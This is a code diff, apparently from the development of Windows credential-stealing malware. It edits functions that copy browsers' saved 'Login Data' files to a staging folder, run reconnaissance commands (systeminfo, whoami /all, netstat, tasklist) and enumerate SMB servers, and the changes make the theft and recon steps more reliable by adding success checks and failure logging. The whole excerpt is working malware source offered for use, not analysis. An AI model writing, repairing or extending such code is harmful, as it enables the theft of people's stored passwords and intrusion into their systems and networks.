@@ -398,13 +398,18 @@ static void StealBrowserCreds(void) {
 
         if (GetFileAttributesW(srcPath) == INVALID_FILE_ATTRIBUTES) continue;
 
-        foundCount++;
         wchar_t destPath[MAX_PATH];
         wsprintfW(destPath, L"%s~br_%s.tmp", BROWSER_DEST_DIR, profileNames[i]);
-        CopyFileW(srcPath, destPath, FALSE);
-        wchar_t buf[128];
-        wsprintfW(buf, L"[+] %s Login Data copied", profileNames[i]);
-        LogMessage(buf);
+        if (CopyFileW(srcPath, destPath, FALSE)) {
+            foundCount++;
+            wchar_t buf[128];
+            wsprintfW(buf, L"[+] %s Login Data copied", profileNames[i]);
+            LogMessage(buf);
+        } else {
+            wchar_t buf[128];
+            wsprintfW(buf, L"[-] %s Login Data copy FAILED", profileNames[i]);
+            LogMessage(buf);
+        }
     }
     wchar_t logBuf[128];
     wsprintfW(logBuf, L"[+] StealBrowserCreds: %d browsers copied", foundCount);
@@ -450,7 +455,7 @@ static void AppendToFile(LPCWSTR path, LPCSTR text) {
     CloseHandle(hFile);
 }
 
-static void RunAndCapture(LPCWSTR cmd, LPCWSTR outputFile) {
+static BOOL RunAndCapture(LPCWSTR cmd, LPCWSTR outputFile) {
     HANDLE hReadPipe, hWritePipe;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
@@ -475,8 +480,11 @@ static void RunAndCapture(LPCWSTR cmd, LPCWSTR outputFile) {
         WaitForSingleObject(pi.hProcess, 30000);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        CloseHandle(hReadPipe);
+        return TRUE;
     }
     CloseHandle(hReadPipe);
+    return FALSE;
 }
 
 static void DoRecon(void) {
@@ -487,17 +495,17 @@ static void DoRecon(void) {
         LogMessage(L"[+] Recon started");
 
         AppendToFile(RECON_PATH, "=== SYSTEM INFO ===");
-        RunAndCapture(L"systeminfo", RECON_PATH);
-        LogMessage(L"[+] Recon: systeminfo completed");
+        LogMessage(RunAndCapture(L"systeminfo", RECON_PATH) ?
+            L"[+] Recon: systeminfo completed" : L"[-] Recon: systeminfo FAILED");
         AppendToFile(RECON_PATH, "=== WHOAMI ===");
-        RunAndCapture(L"whoami /all", RECON_PATH);
-        LogMessage(L"[+] Recon: whoami completed");
+        LogMessage(RunAndCapture(L"whoami /all", RECON_PATH) ?
+            L"[+] Recon: whoami completed" : L"[-] Recon: whoami FAILED");
         AppendToFile(RECON_PATH, "=== NETSTAT ===");
-        RunAndCapture(L"netstat -ano", RECON_PATH);
-        LogMessage(L"[+] Recon: netstat completed");
+        LogMessage(RunAndCapture(L"netstat -ano", RECON_PATH) ?
+            L"[+] Recon: netstat completed" : L"[-] Recon: netstat FAILED");
         AppendToFile(RECON_PATH, "=== TASKLIST ===");
-        RunAndCapture(L"tasklist /v", RECON_PATH);
-        LogMessage(L"[+] Recon: tasklist completed");
+        LogMessage(RunAndCapture(L"tasklist /v", RECON_PATH) ?
+            L"[+] Recon: tasklist completed" : L"[-] Recon: tasklist FAILED");
 
         AppendToFile(RECON_PATH, "=== USER NAME ===");
         HMODULE hSecur32 = GetModuleHandleW(L"secur32");
@@ -664,6 +672,8 @@ static void DoSMBRecon(void) {
                 }
             }
             NetApiBufferFree(pServers);
+        } else {
+            LogMessage(L"[-] DoSMBRecon: NetServerEnum FAILED");
         }
 
         LogMessage(L"[+] SMB scan completed");
